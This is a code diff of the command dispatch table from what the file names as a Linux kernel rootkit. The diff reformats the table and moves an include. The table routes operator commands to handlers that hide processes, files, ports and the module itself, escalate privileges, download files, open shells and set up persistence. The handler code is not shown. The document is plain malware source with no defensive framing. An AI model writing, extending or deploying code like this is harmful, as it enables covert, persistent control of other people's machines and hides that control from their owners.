@@ -1,38 +1,38 @@
 // SPDX-License-Identifier: GPL-2.0
 // execution/dispatch.c - Function pointer dispatch table for commands.
-#include <linux/string.h>
 #include "rootkit.h"
+#include <linux/string.h>
 
 struct rk_dispatch_entry {
-	const char	*prefix;
-	size_t		prefix_len;
-	rk_handler_t	handler;
+	const char *prefix;
+	size_t prefix_len;
+	rk_handler_t handler;
 };
 
 // Longer prefixes first so greedy match works correctly.
 static const struct rk_dispatch_entry dispatch_table[] = {
-	{ "UNHIDE CONTENT ", 15, cmd_unhide_content },
-	{ "HIDE CONTENT ",   13, cmd_hide_content   },
-	{ "UNHIDE MODULE",   13, cmd_unhide_module  },
-	{ "SHELL STATUS",    12, cmd_shell_status   },
-	{ "UNHIDE FILE ",    12, cmd_unhide_file    },
-	{ "UNHIDE PORT ",    12, cmd_unhide_port    },
-	{ "EXEC_SHELL ",     11, cmd_exec_shell     },
-	{ "HIDE MODULE",     11, cmd_hide_module    },
-	{ "UNHIDE PID ",     11, cmd_unhide_pid     },
-	{ "UNHIDE ALL",      10, cmd_unhide_all     },
-	{ "HIDE FILE ",      10, cmd_hide_file      },
-	{ "HIDE PORT ",      10, cmd_hide_port      },
-	{ "ESCALATE ",        9, cmd_escalate       },
-	{ "DOWNLOAD ",        9, cmd_download       },
-	{ "HIDE PID ",        9, cmd_hide_pid       },
-	{ "UNPERSIST",        9, cmd_unpersist      },
-	{ "PERSIST",          7, cmd_persist        },
-	{ "STATUS",           6, cmd_status         },
-	{ "SHELL ",           6, cmd_shell          },
-	{ "LIST ",            5, cmd_list           },
-	{ "QUIT",             4, cmd_quit           },
-	{ "INFO",             4, cmd_info           },
+    {"UNHIDE CONTENT ", 15, cmd_unhide_content},
+    {"HIDE CONTENT ", 13, cmd_hide_content},
+    {"UNHIDE MODULE", 13, cmd_unhide_module},
+    {"SHELL STATUS", 12, cmd_shell_status},
+    {"UNHIDE FILE ", 12, cmd_unhide_file},
+    {"UNHIDE PORT ", 12, cmd_unhide_port},
+    {"EXEC_SHELL ", 11, cmd_exec_shell},
+    {"HIDE MODULE", 11, cmd_hide_module},
+    {"UNHIDE PID ", 11, cmd_unhide_pid},
+    {"UNHIDE ALL", 10, cmd_unhide_all},
+    {"HIDE FILE ", 10, cmd_hide_file},
+    {"HIDE PORT ", 10, cmd_hide_port},
+    {"ESCALATE ", 9, cmd_escalate},
+    {"DOWNLOAD ", 9, cmd_download},
+    {"HIDE PID ", 9, cmd_hide_pid},
+    {"UNPERSIST", 9, cmd_unpersist},
+    {"PERSIST", 7, cmd_persist},
+    {"STATUS", 6, cmd_status},
+    {"SHELL ", 6, cmd_shell},
+    {"LIST ", 5, cmd_list},
+    {"QUIT", 4, cmd_quit},
+    {"INFO", 4, cmd_info},
 };
 
 static size_t strip_trailing(const u8 *buf, size_t len)
